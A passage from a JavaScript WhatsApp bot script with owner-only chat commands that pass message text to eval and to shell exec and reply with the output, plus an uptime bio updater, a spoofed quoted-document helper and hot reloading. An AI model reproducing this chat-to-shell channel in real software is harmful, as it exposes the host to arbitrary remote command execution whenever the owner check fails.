                                if(typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                                m.reply(evaled)
                            } catch (err) {
                                m.reply(util.format(err))
                            };
                        };
                        if(m.body.startsWith(">")) {
                            if(!m.isOwner) return
                            try {
                                function Return(sul) {
                                    var sat = JSON.stringify(sul, null, 2)
                                    var bang = util.format(sat)
                                if(sat == undefined) {
                                    bang = util.format(sul)
                                }
                                    return m.reply(bang)
                                };
                                m.reply(util.format(eval(`(async () => { ${m.body.slice(1)} })()`)))
                            } catch (err) {
                                m.reply(util.format(err))
                            };
                        };
                        if(m.body.startsWith("<")) {
                            if(!m.isOwner) return
                            try {
                                return m.reply(JSON.stringify(eval(`${m.args.join(' ')}`),null,'\t'))
                            } catch (err) {
                                m.reply(util.format(err))
                            };
                        };
                        if(m.body.startsWith("$")) {
                            if(!m.isOwner) return
                            var qur = m.body.slice(1)
                            try {
                                exec(qur, (err, stdout) => {
                                    if(err) return m.reply(util.format(err))
                                    if(stdout) {
                                        m.reply(util.format(stdout))
                                    };
                                });
                            } catch (err) {
                                m.reply(util.format(err))
                            };
                        };
                    }, 1000);
                };
                if(switching.autobio.status) {
                    if(new Date() * 1 - switching.autobio.count > 1000) {
		                var uptime = await kyun(process.uptime())
		                await delay(1000)
		                await razzaq.updateProfileStatus(`Aktif Selama: ${uptime}`)
		                switching.autobio.count = new Date() * 1
	                };
	            };
                function doc() { 
                    return {
                        key: {
                            fromMe: false, 
                            participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
                        },
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
                                mimetype: "application/octet-stream",
                                fileSha256: "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
                                fileLength: "64455",
                                pageCount: 1,
                                mediaKey: "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
                                fileName: m.name,
                                fileEncSha256: "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
                            },
                        },
                    };
                };
                function kyun(s) {
                function pad(s) {
                    return (s < 10 ? '0' : '') + s;
                };
                    var hours = Math.floor(s / (60 * 60));
                    var minutes = Math.floor(s % (60 * 60) / 60);
                    var seconds = Math.floor(s % 60);
                    return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`;
                };
                function rand(text) {
                    return text[Math.floor(Math.random() * text.length)]
                };
            } catch (err) {
                if(String(err).includes("service-unavailable")) {
                    return;
                };
            };
        },
    };
    
    let LordROJAK = require.resolve(__filename)
        fs.watchFile(LordROJAK, () => {
	        fs.unwatchFile(LordROJAK) 
        	console.log(chalk.bold(chalk.redBright('[FILE]'), chalk.blueBright('Update!'), chalk.yellowBright(__filename)))
    	    delete require.cache[LordROJAK]
      	    require(LordROJAK)
    });